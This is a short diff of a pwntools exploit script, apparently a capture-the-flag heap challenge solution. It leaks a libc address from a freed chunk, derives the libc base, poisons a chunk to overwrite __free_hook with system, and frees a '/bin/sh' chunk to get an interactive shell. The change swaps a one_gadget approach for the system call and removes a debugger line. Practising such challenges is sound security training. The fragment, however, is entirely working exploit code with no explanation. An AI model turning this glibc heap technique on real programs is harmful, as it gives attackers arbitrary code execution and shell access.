@@ -43,15 +43,15 @@ edit(0,'\x00'*0x70)
 free(0)
 
 free(1)
-gdb.attach(p)
 show(1)
 p.recvline()
-libcbase = u64(p.recv(6).ljust(8,'\x00')) - 0x1E4CA0
+malloc_hook = u64(p.recv(6).ljust(8,'\x00'))  - 0x70
+libcbase = malloc_hook - libc.sym['__malloc_hook']
 log.success('LibcBase:\t' + hex(libcbase))
 free_hook = libcbase + libc.sym['__free_hook']
-one_gadget = libcbase + 0x13B25A
+system = libcbase + 0x71FF0
 add(p64(free_hook),'\x00'*0x70)
-add(p64(0),'\x00'*0x70)
-add(p64(one_gadget),'\x00'*0x70)
+add('/bin/sh\x00','\x00'*0x70)
+add(p64(system),'\x00'*0x70)
 free(5)
 p.interactive()
